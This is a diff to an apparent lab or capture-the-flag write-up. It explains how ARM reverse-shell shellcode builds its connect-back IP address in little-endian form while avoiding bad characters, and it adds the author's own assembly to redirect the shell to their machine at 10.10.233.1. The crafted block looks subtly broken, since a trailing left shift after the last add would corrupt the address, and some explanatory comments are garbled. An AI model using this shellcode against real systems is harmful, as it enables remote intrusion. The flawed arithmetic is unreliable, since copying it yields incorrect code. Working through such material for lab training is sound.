@@ -80,10 +80,40 @@ push {r1}       // 192.168.100.1
 
 If you're reading this and re anything like myself - you probably just experienced an involuntary inner *groan* at the site fo the assembly code...  but please stay with me for a while longer and I hope to demystify this code block for you.
 
-First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.
+First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.  It is also worth keeping in mind that ARM uses a little-endian system which essentially means that the octets of the IP address are stored in reverse order, i.e. `1.100.168.192`.
 
+So what's going on with the assembly instructions storing the IP address value of `192.168.100.1`?
 
+-  Move 0x164 to register R1 (i.e. 356 in decimal)
+-  Shift the rgister left by eight bits (i.e. perform 356 x 256 = 91136)
+-  Add 0xA8 to R1 (i.e. perform 91136 + 168 = 91304)
+-  Shift the rgister left by eight bits (i.e. perform 91304 x 256 = 23373824)
+-  Add 0xC0 to R1 (i.e. perform 23373824 + 192 = **23374016**)
 
+So now we have value of `23374016` (decimal) stored in register R1.  If we convert this to a 32-bit binary and divide into octets we get: **`00000001.01100100.10101000.11000000`**, and i fwe convert this back to decimal we will get: **`1.100.168.192`** - which is the little-endian representation of the IP address we were looking to store.
+
+If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable.
+
+Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.233.1`.
+
+```
+/* ADDR */
+mov r1, #0x01    // store '1' in R1
+lsl r1, #8      // shift by 8 bits to te left
+add r1, #0xe9   // add '233' to R1
+lsl r1, #8     // shift by 8 bits to te left
+add r1, #0x08    // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
+add r1, #0x02
+lsl r1, #8     // shift by 8 bits to te left
+add r1, #0x08    // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
+add r1, #0x02
+lsl r1, #8     // shift by 8 bits to te left
+push {r1}       
+```
+
+#  
+#  
+#  
 ```
 21      /* ADDR */
 22      mov r1, #0xEC       ; Move 0xEC into register r1 (0x0A * 256 + 0xEC = 10.10)
